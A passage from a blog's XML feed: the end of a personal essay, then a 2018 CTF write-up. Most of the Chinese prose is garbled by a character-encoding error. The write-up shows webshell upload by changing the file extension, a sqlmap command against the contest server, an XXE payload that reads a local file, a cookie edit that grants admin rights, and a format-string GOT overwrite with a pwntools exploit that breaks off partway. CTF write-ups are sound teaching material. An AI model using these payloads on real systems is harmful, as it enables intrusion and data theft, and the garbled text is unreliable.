ÊàñËÆ∏ÂæóÂà∞‰∫Ü‰ªÄ‰πà‰∏úË•øÔºåÂ∞±ËØ•Â§±ÂéªÁÇπÂè¶Â§ñÁöÑ‰ªÄ‰πà‰∏úË•ø„ÄÇÊâÄ‰ª•ÈÇ£ÊÆµÊó∂Èó¥ÊàëÂè™ÊòØÁîüÊ¥ªÂú®‰∏Ä‰∏™Â∞èÂúàÂ≠êÈáåÔºåËôΩÁÑ∂ÈîôËøá‰∫ÜÂæàÂ§öÂæàÂ§öÁöÑÁ≤æÂΩ©ÔºåËôöÂ∫¶‰∫Ü‰∫õËÆ∏Êó∂Êó•Ôºå‰ΩÜ‰πüÊàêÈïø‰∫ÜËÆ∏Â§ö„ÄÇÁªèÂéÜ‰∫ÜÁßçÁßçÂêéÔºåÊàëÊâçÈÄêÊ∏êÊòéÁôΩÊàëÁöÑÂ§ßÂ≠¶ÁîüÊ¥ªÔºå‰πÉËá≥‰∫∫ÁîüÊÑè‰πâÊâÄÂú®üò•ÔºåÈ£éËä±Èõ™Êúà‰∏çËøáÂÅ∂Â∞îÔºåËá™Âº∫‰∏çÊÅØ‰æøÊúâËøúÊñπ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÊâÄË∞ìÂ§ßÂ≠¶ËÄÖÔºåÈùûË∞ìÊúâÂ§ßÊ•º‰πãË∞ì‰πüÔºåÊúâÂ§ßÂ∏à‰πãË∞ì‰πüÔºå‰ΩÜÊòØÁé∞Âú®ÂèàÊúâÂá†‰∏™ËÉΩÂÅöÂà∞Ôºü„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ‰∏éÂÖ∂Â•¢ÊúõÂπ≥Âè∞Â¶Ç‰ΩïÂ¶Ç‰ΩïÂ∏ÆËá™Â∑±ÔºåÈÇ£‰∏∫‰Ωï‰∏ç‚ÄúÂ§©Ë°åÂÅ•ÔºåÂêõÂ≠ê‰ª•Ëá™Âº∫‰∏çÊÅØ‚ÄùÂë¢Ôºü</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Â§ßÂ≠¶Âè™ÊòØ‰∏Ä‰∏™Âπ≥Âè∞Ôºå‰∏Ä‰∏™Áªô‰Ω†ÂéªÁîüÊ¥ªÔºåÂéªÂ±ïÁ§∫ÔºåÂéªÂÆûÁé∞ÔºåÂéªÂàõÈÄ†ÔºåÂéª‰ΩìÈ™åÁ§æ‰ºöÁöÑÂ∞èÁ©∫Èó¥„ÄÇÂΩìÁÑ∂ÔºåÂèØËÉΩÊüê‰∫õ‰∫∫ËøõÂÖ•Â§ßÂ≠¶‰πãÂêéÔºåÂïäÊàëÁöÑÂ§ßÂ≠¶ÊÄé‰πàÊÄé‰πàÊ†∑ÔºåÊÄé‰πàÊÄé‰πàÊÉ®ÔºåÊä±ÊÄ®ËµÑÊ∫ê‰∏çÂÖ¨ÔºåÂìÄÂèπÁ§æ‰ºöÂ¶Ç‰ΩïÔºåÁÑ∂ÂêéËΩ¨Ë∫´ÂèàÊâëËøõ‰∫ÜÊ∏∏Êàè‰∏ñÁïå„ÄÇÊÉ≥ÊÉ≥ÂÖ∂ÂÆû‰πüÊå∫ÂÇªÁöÑÔºå‰∏çÂÖ¨ËÉΩÊÄéÊ†∑ÔºüË∞ÅËÆ©Ëá™Â∑±Êêè‰∏ç‰∫Ü‰∏Ä‰∏™Â•ΩÂπ≥Âè∞ÔºåË∞ÅËÆ©Ëá™Â∑±Âæó‰∏çÂà∞ÈÇ£ÁÇπ‰ªÖÊúâÁöÑËµÑÊ∫êÔºåÂèàÊòØË∞ÅÂú®‰∏ÄÊ¨°‰∏ÄÊ¨°Â†ïËêΩ‰πãÂêéÁªßÁª≠Â†ïËêΩÔºüÈÇ£ËÇØÂÆöÊòØËá™Â∑±ÂíØüò≠„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÊâÄ‰ª•Â¶ÇÊûúËá™Â∑±‰∏çÂéªÂÆûÁé∞‰∏ÄÁÇπËÉΩÂ§üÂÆûÁé∞ÁöÑ‰ª∑ÂÄºÔºåÊù•Âç∞ËØÅ‰∏Ä‰∏ãËá™Â∑±ÁöÑËÉΩÂäõÔºåÈÇ£Â¶Ç‰ΩïÊâçËÉΩËé∑ÂæóÈÇ£ÊâÄË∞ìÁöÑÂÖ¨Âπ≥ÔºåÂ¶Ç‰ΩïÂéªËûçÂÖ•‰Ω†ÊâπÂà§ÔºåÂìÄÂèπÁöÑÈÇ£‰∏™Á§æ‰ºö„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Êú™Êù•‰πãË∑ØËôΩÁÑ∂ÂùéÂù∑Ôºå‰ΩÜÂ∏åÊúõ‰∏éËØ∏‰ΩçÂêåË°å‰πã‰∫∫ÔºåÂÖ±ÂêåÂâçËøõ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
      
      
      <categories>
          
          <category> ÊùÇÊñá </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÊùÇÊñá </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wandoucup-ctf</title>
      <link href="/2018/10/28/wandoucup-ctf/"/>
      <url>/2018/10/28/wandoucup-ctf/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote><p>Ëøô‰∏§Â§©Âú®Êâì‰∏Ä‰∏™Á®çÂæÆÁÆÄÂçïÁöÑCTFÔºåÂÜô‰∏™writeupËÆ∞ÂΩï‰∏Ä‰∏ãË¢´ËôêÁöÑËøáÁ®ãüò≠ÔºåÊÄªÁöÑÊù•ËØ¥ËøôÂú∫Â∞èËµõÊòØ‰∏™Â§ßÊùÇÁÉ©ÔºåÊØïÁ´ü‰Ω†ÊáÇÁöÑüòèÔºå‰Ωú‰∏∫ÂÅöÈ¢òËÄÖÊàë‰ª¨ÂΩìÁÑ∂ÊòØÊúâÈ¢òÂÅöÂ∞±okÁöÑ„ÄÇ</p><p>Áî±‰∫éÊØîËµõÂêéÁéØÂ¢ÉÂÖ≥Èó≠ÔºåÊâÄ‰ª•ÊúâÁöÑÊó†ÂõæÁâáÂ±ïÁ§∫ÔºåÁé∞ÊúâÁöÑÂõæÁâáÊòØ‰∏ãÂçàÂ∞±ÂáÜÂ§áÂÜôwriteupÊà™ÁöÑÂõæ„ÄÇ</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-Á≠æÂà∞È¢ò"><a href="#web1-Á≠æÂà∞È¢ò" class="headerlink" title="web1-Á≠æÂà∞È¢ò"></a>web1-Á≠æÂà∞È¢ò</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">È¢òÁõÆÈìæÊé•</a></p><blockquote><p>Ë∑üÊüêÂá†‰∏™ctfÁªÉ‰π†Âπ≥Âè∞‰∏äÈù¢ÁöÑÊªëÁ®ΩÈ¢ò‰∏ÄÊ†∑Ôºö</p><p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p></blockquote><p>‰∏ÄÈîÆËé∑ÂèñflagüòÑ„ÄÇ</p><h3 id="web2-ËæìÂÖ•ÂØÜÁ†ÅÊü•Áúãflag"><a href="#web2-ËæìÂÖ•ÂØÜÁ†ÅÊü•Áúãflag" class="headerlink" title="web2-ËæìÂÖ•ÂØÜÁ†ÅÊü•Áúãflag"></a>web2-ËæìÂÖ•ÂØÜÁ†ÅÊü•Áúãflag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">È¢òÁõÆÈìæÊé•</a></p><blockquote><p>ÁÆÄÂçïÊµèËßà‰∏Ä‰∏ãÔºåÂ∞±ÊòØ‰∏Ä‰∏™ÁàÜÁ†¥ÁöÑÈ¢òÔºö</p><p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p><p>ÂØÜÁ†Å‰∏∫‰∫î‰ΩçÊï∞ÔºåÈÇ£Êàë‰ª¨Áõ¥Êé•‰∏äburpsuiteÂíØÔºöËÆæÁΩÆÈïøÂ∫¶ÂíåpayloadÂ≠óÁ¨¶Ôºö</p><p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p><p>GET FLAG!</p></blockquote><h3 id="web3-ËøôÁúüËÉΩ‰º†È©¨Ôºü"><a href="#web3-ËøôÁúüËÉΩ‰º†È©¨Ôºü" class="headerlink" title="web3-ËøôÁúüËÉΩ‰º†È©¨Ôºü"></a>web3-ËøôÁúüËÉΩ‰º†È©¨Ôºü</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">È¢òÁõÆÈìæÊé•</a></p><blockquote><p>ÁÆÄÂçïÂú∞ÊäìÂåÖ‰øÆÊîπÂèÇÊï∞Ôºå‰ªéËÄå‰ΩøÂæóËá™Â∑±ËÉΩÂ§ü‰º†phpÔºåÊàëÁõ¥Êé•‰∏ä‰∫Ü‰∏Ä‰∏™Â§ßÈ©¨ÔºåÁÑ∂ÂêéÁúã/opt/flag.txt„ÄÇ</p><p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p><p>ÊäìÂåÖÂèØ‰ª•ÁúãÂà∞url‰∏≠ÁöÑextÂèÇÊï∞‰º†ÈÄíÁöÑÊòØÊñá‰ª∂Á±ªÂûãÔºåÁåúÊµãÊòØÂèØ‰ª•‰øÆÊîπÔºåÊàë‰ª¨Âä†‰∏™phpÂà∞‰∏≠Èó¥Âç≥ÂèØÊàêÂäüÂú∞Áõ¥Êé•‰∏ä‰º†webshellÔºàÂæàÊä†ËÑöÔºâ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56da602535.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂÜç‰øÆÊîπ‰∏Ä‰∏ãcontent-typeÂç≥ÂèØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" class="lazyload"></p></blockquote><p>To /opt/flag.txt  get flag==&gt;üòÑ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" class="lazyload"></p><h3 id="web4-ËøôÁúüËÉΩÊ≥®ÂÖ•Ôºü"><a href="#web4-ËøôÁúüËÉΩÊ≥®ÂÖ•Ôºü" class="headerlink" title="web4-ËøôÁúüËÉΩÊ≥®ÂÖ•Ôºü"></a>web4-ËøôÁúüËÉΩÊ≥®ÂÖ•Ôºü</h3><p>È¢òÁõÆÈìæÊé•</p><blockquote><p>ÊµèËßà‰∏Ä‰∏ãÔºåÂä†‰∏™ÂçïÂºïÂè∑ËØïËØïÂ∞±‰∏Ä‰∏™ÂæàÊòéÊòæÁöÑÊ≥®ÂÖ•ÂíØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56f5203775.png" class="lazyload"></p><p>Áõ¥Êé•sqlmapÊ≥®ÂÖ•Âç≥ÂèØÔºå<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p><p>ÂæóÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÁõ¥Êé•ÈÄêÊ≠•ÊåáÂÆöÊï∞ÊçÆÂ∫ìË°®ÔºåÊåáÂÆöÂ≠óÊÆµÔºådumpÂç≥ÂèØ„ÄÇ</p><p>Áî±‰∫éÊØîËµõÂêéÊúçÂä°Â∑≤ÁªèÂÖ≥Èó≠ÊïÖÊú™ËÉΩÊà™ÂèñÊàêÂäüÂõæÁâá„ÄÇ</p></blockquote><h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote><p>ËøôÈ¢òÊòØxxeÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÔºåÈÄöËøáÊäìÂåÖÔºå‰øÆÊîπPOSTÊï∞ÊçÆ‰ª•ÂèäContent-type‰ªéËÄåËØªÂèñÂà∞/tmp/flag.txt„ÄÇ</p><blockquote><p>XXEÊºèÊ¥ûÂ∞±ÊòØÊúçÂä°Âô®Êé•Âèó‰ªéÂÆ¢Êà∑Á´ØÂèëÈÄÅÊù•ÁöÑxmlÊ†ºÂºèÊï∞ÊçÆÊó∂ÔºåxmlÊï∞ÊçÆ‰∏≠ÊÅ∂ÊÑèÁöÑÂºïÁî®‰∫ÜÂ§ñÈÉ®ÂÆû‰ΩìÔºåÂ∞ÜÂÆÉÁöÑÂÄºÁªëÂÆö‰∏∫ÊúçÂä°Âô®ÁöÑÁõÆÊ†áÊñá‰ª∂ÔºåËøôÊ†∑Âú®ÊúçÂä°Âô®ËøîÂõûÁªôÊàë‰ª¨Ëß£ÊûêÂêéÁöÑÂÄºÊó∂ÔºåÂ∞±‰ºöÊääÁõÆÊ†áÊñá‰ª∂ÁöÑÂÜÖÂÆπËøîÂõûÁªôÊàë‰ª¨Ôºå‰ªéËÄåËØªÂèñÊïèÊÑüÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ</p></blockquote><p>È¢òÁõÆÂéüÊú¨‰º†ËæìÁöÑ<code>Content-type: application/json</code>Êîπ‰∏∫<code>Content-type: application/xml</code>ÔºåÂπ∂Â∞ÜPOSTÁöÑÊï∞ÊçÆÊîπ‰∏∫‰ª•‰∏ãxml‰ª£Á†Å:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=‚Äù1.0‚Ä≥?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM ‚Äúfile:///tmp/flag.txt‚Äù></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span></code></pre><p>ÁÑ∂ÂêéÂèëÈÄÅÊï∞ÊçÆÂåÖÔºåÂ∞±ÂèØÂæóÂà∞apiËøîÂõûÁöÑflag‰∫Ü„ÄÇ</p></blockquote><h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote><p>ËøôÈÅìÈ¢òÊúâÁÇπ‰∏úË•øÔºå‰∏ÄÊ≠•‰∏ÄÊ≠•Ê∑±ÂÖ•ÔºåÂà∞ÊúÄÂêé‰∏Ä‰∏™ÊèêÁ§∫ÊîæÂá∫‰πãÂêéÂá†ÂàÜÈíüÔºåËøÖÈÄüÊãøÂà∞flag„ÄÇ</p><p>Ê≠•È™§ÔºöÁôªÂΩïÂíåÊ≥®ÂÜåÁïåÈù¢ÈúÄË¶ÅÂÜôËÑöÊú¨ÊäõÂá∫ÂØπÂ∫îËßÑÂàôÁöÑcodeÔºåÁÑ∂ÂêéÈÄöËøáÁõÆÂΩïÈÅçÂéÜÂæóÂà∞ÈÉ®ÂàÜÈ°µÈù¢Ê∫êÁ†Å‰ª•Âèä‰∏Ä‰∏™ÁõÆÂΩï(ÂàÜÂà´ÊòØ<code>user.php~</code>Ôºå <code>config.php~</code>Ôºå<code>adminpic</code>)ÔºåÊ†πÊçÆÊ∫êÁ†ÅÂèØ‰ª•ÂæóÁü•adminpicÊòØadminÁî®Êà∑‰∏ä‰º†Êñá‰ª∂ÁöÑ‰∏Ä‰∏™ÁõÆÂΩïÔºåÂπ∂‰∏îÊàë‰ª¨ÂèØ‰ª•ÂæóÂà∞Êï∞ÊçÆÂ∫ìË¥¶Âè∑ÂØÜÁ†ÅÔºåÂÖ®Á´ØÂè£Êâ´ÊèèÂæóÂà∞23306Á´ØÂè£‰∏∫Êï∞ÊçÆÂ∫ìÊúçÂä°Á´ØÂè£ÔºåÁôªÈôÜÂêéÂæóÂà∞adminË¥¶Êà∑ÂØÜÁ†ÅÔºåÁªèËøáÂ§ßÂçäÂ§©ÁöÑÁ†¥Ëß£md5‰πãÂêéÔºåÂæóÂà∞ÊèêÁ§∫<code>crypto.html</code>ÔºåËøôÊòØ‰∏Ä‰∏™ÊåáÂÆöÁöÑËß£ÂØÜmd5ÁöÑÈ°µÈù¢ÔºåËæìÂÖ•adminÂØÜÁ†ÅhashÂÄºÁ†¥Ëß£ÂæóÂà∞ÊèêÁ§∫<code>crypto.png</code>ÔºåËÆøÈóÆÂæóÂà∞‰∫åÁª¥Á†ÅÔºåÊâ´ÊèèÂç≥ÂèØËé∑ÂæóÂØÜÁ†Å<code>wandouxueyuan:)</code>ÔºåÁî®Ê≠§ÂØÜÁ†ÅÂèØÁôªÂΩïadminË¥¶Êà∑ÔºåÊù•Âà∞‰∏ä‰º†ÂõæÁâápublishÈ°µÈù¢ÔºåÁªìÂêàÂâçÈù¢ÈÅçÂéÜÂæóÂà∞ÁöÑ‰∏Ä‰∏™<code>adminpic</code>ÁõÆÂΩïÂèØ‰ª•Áü•ÈÅì‰∏ä‰º†Êñá‰ª∂Âú®Ê≠§ÁõÆÂΩï‰∏≠ÔºåÁªèËøáÁÆÄÂçïÁöÑÁªïËøáÂêé‰∏ä‰º†Â§ßÈ©¨Âç≥ÂèØ„ÄÇ</p><p>ÂÇªÂÇªÁöÑÊàëËøòÂ∞ùËØïÊñá‰ª∂ÂåÖÂê´Ôºåsession_decodeÔºå‰ª•ÂèäregisterÊ≥®ÂÜåÁ≠âÁ≠âÊìç‰Ωú„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" class="lazyload"></p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" class="lazyload"></p><p>‰º†ÂÆåÈ©¨ÂêéËÆøÈóÆ/adminpicÁõÆÂΩïÂç≥ÂèØÁúãÂà∞Ëá™Â∑±‰∏ä‰º†ÁöÑÊñá‰ª∂Ôºå‰ªéËÄågetshellÊãøÂà∞flagÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" class="lazyload"></p><h3 id="webÈôÑÂä†È¢ò-atom"><a href="#webÈôÑÂä†È¢ò-atom" class="headerlink" title="webÈôÑÂä†È¢ò-atom"></a>webÈôÑÂä†È¢ò-atom</h3><blockquote><p>ËøôÈÅìwebÂä†È§êÈ¢òÔºåÂÆûÈôÖ‰∏äÂ∞±ÊòØÁî®ÁªôÁöÑË¥¶Êà∑ÂØÜÁ†ÅÁôªÂΩïÂêéÂ∞Ücookie‰∏≠ÁöÑ<code>admin=0</code>Êîπ‰∏∫<code>admin=1</code>ÔºåÁÑ∂Âêé‰ºöË∑≥ËΩ¨Âà∞‰∏Ä‰∏™ÂêéÂè∞ÔºåÁÑ∂ÂêéÊü•ÁúãÂêéÂè∞Ê∫êÁ†ÅÂç≥ÂèØÂæóÂà∞ÁúüÊ≠£ÁöÑflag„ÄÇ</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote><p>‰∏â‰∏™pwnÈÉΩÈùûÂ∏∏ÁªèÂÖ∏ÔºåÂàÜÂà´ËÄÉÂØüÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåÁÆÄÂçïÁöÑÊ∫¢Âá∫Ôºå‰ª•Âèäret2sysÂá†‰∏™Áü•ËØÜÁÇπ„ÄÇ</p></blockquote><h3 id="pwn1‚ÄìÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û"><a href="#pwn1‚ÄìÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û" class="headerlink" title="pwn1‚ÄìÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û"></a>pwn1‚ÄìÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û</h3><p>ÈÄöËøáÁî®IDAÁÆÄÂçïÂú∞ÂàÜÊûê‰∏Ä‰∏ãÈÄªËæëÔºåÂèØ‰ª•ÁúãÂà∞printfÂ§ÑÂ≠òÂú®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºö</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_funÂáΩÊï∞‰º™c‰ª£Á†Å</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    v4<span class="token punctuation">,</span>    v5<span class="token punctuation">,</span>    v6<span class="token punctuation">,</span>    format<span class="token punctuation">,</span>    v8<span class="token punctuation">,</span>    v9<span class="token punctuation">,</span>    v10<span class="token punctuation">,</span>    v11<span class="token punctuation">,</span>    v12<span class="token punctuation">,</span>    v13<span class="token punctuation">,</span>    v14<span class="token punctuation">,</span>    v15<span class="token punctuation">,</span>    v16<span class="token punctuation">,</span>    v17<span class="token punctuation">,</span>    v18<span class="token punctuation">,</span>    v19<span class="token punctuation">,</span>    v20<span class="token punctuation">,</span>    v21<span class="token punctuation">,</span>    v22<span class="token punctuation">,</span>    v23<span class="token punctuation">,</span>    v24<span class="token punctuation">,</span>    v25<span class="token punctuation">,</span>    v26<span class="token punctuation">,</span>    v27<span class="token punctuation">,</span>    v28<span class="token punctuation">,</span>    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//Ë¶ÜÁõñgotË°®‰∏≠fflushÊù°ÁõÆÊåáÂêëÁöÑÂú∞ÂùÄÔºåÂ∞ÜÂÖ∂ÊåáÂêëread_flagÂáΩÊï∞</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ÁÆÄÂçïËøêË°å‰∏Ä‰∏ãÔºåÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†ËØ≠Âè•Ôºö<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>ÔºåÁÑ∂ÂêéËæìÂÖ•ÂæóÂà∞Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÁöÑËæìÂÖ•Ë¢´ÊîæÂú®‰∫ÜprintfÂáΩÊï∞Ê†à‰∏≠ÁöÑÁ¨¨6‰∏™‰ΩçÁΩÆÔºàËøôÈáåÁöÑ%pÊòØc/c++‰∏≠Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÂèÇÊï∞ÔºâÔºåÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊúÄ‰∏ªË¶ÅÁöÑÂç±ÂÆ≥Â∞±ÊòØÂèØ‰ª•Ëé∑Âèñ‰ªªÊÑèÂú∞ÂùÄÂÜÖÂÆπÔºåÊàñËÄÖÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂÜôÔºåÈÇ£‰πàÊàë‰ª¨ËøôÂ∞±ÊòØÈÄöËøá‰ªªÊÑèÂú∞ÂùÄÂÜôÔºåÊù•Ë¶ÜÁõñgotË°®Ôºå‰πãÂâçÁöÑ<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">ÁªÉ‰π†ËÆ∞ÂΩï</a>‰∏≠Â∞±ÊèêÂà∞‰∫ÜËøô‰∫õÁü•ËØÜ„ÄÇ</p><p>Êó¢ÁÑ∂Áü•ÈÅì‰∫ÜÂà©Áî®‰ΩçÁΩÆÔºåÈÇ£‰πàÁõ¥Êé•Âà©Áî®pwntoolsÊûÑÈÄ†expÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#io = process('./200')</span>elf <span class="token operator">=</span> ELF<span 